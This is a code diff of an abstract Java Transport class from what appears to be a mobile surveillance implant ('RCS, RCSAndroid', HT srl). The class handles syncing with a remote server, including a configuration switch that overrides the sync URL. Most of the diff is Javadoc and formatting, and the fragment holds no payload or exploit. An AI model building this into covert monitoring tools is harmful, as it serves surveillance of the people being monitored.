@@ -1,47 +1,95 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : Transport.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI.action.sync;
 
 import com.ht.RCSAndroidGUI.Debug;
+import com.ht.RCSAndroidGUI.conf.Configuration;
 
-
-/* *************************************************
- * Copyright (c) 2010 - 2011
- * HT srl,   All rights reserved.
- * 
- * Project      : RCS, RCSBlackBerry
- * *************************************************/
-	
-
+// TODO: Auto-generated Javadoc
+/**
+ * The Class Transport.
+ */
 public abstract class Transport {
-    //#ifdef DEBUG
-    private static Debug debug = new Debug("Transport");
-    //#endif
+	/** The debug. */
+	private static String TAG = "Transport";
+	/** The timeout. */
+	protected final int timeout = 3 * 60 * 1000;
 
-    protected final int timeout = 3 * 60 * 1000;
+	/** The baseurl. */
+	protected String baseurl;
 
-    protected String baseurl;
-    protected String suffix;
+	/** The suffix. */
+	protected String suffix;
 
-    public Transport(String baseurl) {
-        //this.host = host;
-        //this.port = port;
-        this.baseurl = baseurl;
-    }
+	/**
+	 * Instantiates a new transport.
+	 * 
+	 * @param baseurl
+	 *            the baseurl
+	 */
+	public Transport(final String baseurl) {
 
-    public String toString() {
-        return "Transport " + getUrl();
-    }
+		if(Configuration.OVERRIDE_SYNC_URL){
+			this.baseurl = Configuration.SYNC_URL;
+		}else{
+			this.baseurl = baseurl;
+		}
+	}
 
-    public abstract boolean isAvailable();
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see java.lang.Object#toString()
+	 */
+	@Override
+	public String toString() {
+		return "Transport " + getUrl();
+	}
 
-    public abstract byte[] command(byte[] data) throws TransportException;
+	/**
+	 * Checks if is available.
+	 * 
+	 * @return true, if is available
+	 */
+	public abstract boolean isAvailable();
 
-    //public abstract void initConnectionUrl();
-    protected abstract String getSuffix();
+	/**
+	 * Command.
+	 * 
+	 * @param data
+	 *            the data
+	 * @return the byte[]
+	 * @throws TransportException
+	 *             the transport exception
+	 */
+	public abstract byte[] command(byte[] data) throws TransportException;
 
-    public abstract void close();
+	// public abstract void initConnectionUrl();
+	/**
+	 * Gets the suffix.
+	 * 
+	 * @return the suffix
+	 */
+	protected abstract String getSuffix();
 
-    public String getUrl() {
-        return baseurl ;
-    }
+	/**
+	 * Close.
+	 */
+	public abstract void close();
+
+	/**
+	 * Gets the url.
+	 * 
+	 * @return the url
+	 */
+	public String getUrl() {
+		return baseurl;
+	}
 
 }
